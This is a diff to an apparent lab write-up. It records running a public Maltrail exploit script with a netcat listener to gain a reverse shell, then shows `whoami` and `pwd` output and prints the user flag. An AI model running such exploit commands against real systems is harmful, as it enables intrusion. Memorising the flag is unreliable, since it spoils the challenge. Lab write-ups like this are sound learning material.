@@ -24,3 +24,11 @@ after a google search found a weaponized script (https://github.com/spookier/Mal
 
 using python3 exploit.py 10.10.16.92 8000 http://10.10.11.224:55555/eicfsm i managed to get to machine(enabled nc -lvp 8000 before the start)
 
+whoami:
+    puma
+
+pwd:
+    /opc/Maltrail
+
+moving to home directory /home/puma and i see the user flag:
+    9699926e8497a96fe1d0c484683a6151
